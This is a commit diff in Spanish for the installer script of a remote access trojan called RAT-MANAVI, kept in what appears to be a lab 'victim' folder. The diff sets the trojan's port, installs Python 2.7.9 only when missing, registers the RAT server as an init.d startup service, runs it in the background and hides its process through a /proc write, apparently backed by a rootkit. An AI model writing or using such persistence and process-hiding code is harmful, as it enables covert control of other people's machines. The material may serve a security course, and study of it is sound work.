Instalador versión funcional

+++ LABORATORIO/victima/instalador.sh
@@ -9,7 +9,7 @@ PYTHON279_PREFIX=/usr/local/lib/
 PYTHON279=${PYTHON279_PREFIX}python2.7.9/bin/python
 
 RAT_USER=manavi
-SPORT=6660
+SPORT=6666
 
 ping -c 4 www.google.com > /dev/null 2>>/dev/null
 
@@ -63,13 +63,19 @@ apt-get -y install sshpass 1>/dev/null
 $MODPROBE snd_pcm_oss 
 
 #Requesito especial para python2.7.9
-wget -q https://www.python.org/ftp/python/2.7.9/Python-2.7.9.tgz 
-tar xfz Python-2.7.9.tgz 1>/dev/null
-rm Python-2.7.9.tgz
-cd Python-2.7.9/
-./configure --prefix $PYTHON279_PREFIX''python2.7.9 1>/dev/null
-make 1>/dev/null
-make install 1>/dev/null
+
+if [ ! -f $PYTHON279 ]
+then
+	wget -q https://www.python.org/ftp/python/2.7.9/Python-2.7.9.tgz 
+	tar xfz Python-2.7.9.tgz 1>/dev/null
+	rm Python-2.7.9.tgz
+	cd Python-2.7.9/
+	./configure --prefix $PYTHON279_PREFIX''python2.7.9 1>/dev/null
+	make 1>/dev/null
+	make install 1>/dev/null
+else
+	echo "Ya cuentas con python2.7.9, continuamos con la instalación."
+fi
 
 #Agregar a init.d script server
 ln -s $RAT_DIR''RAT-MANAVI/server.py /etc/init.d/
@@ -79,7 +85,8 @@ ln -s $RAT_DIR''RAT-MANAVI/server.py /etc/init.d/
 #$INSMOD rootkit.ko
 
 #Ejecutar el server.py
-$PYTHON279 $RAT_DIR''RAT-MANAVI/server.py
+cd ${RAT_DIR}RAT-MANAVI/
+$PYTHON279 $RAT_DIR''RAT-MANAVI/server.py &
 
 #Ocultar proceso
 echo "hpid $$" > /proc/buddyinfo 2>/dev/null
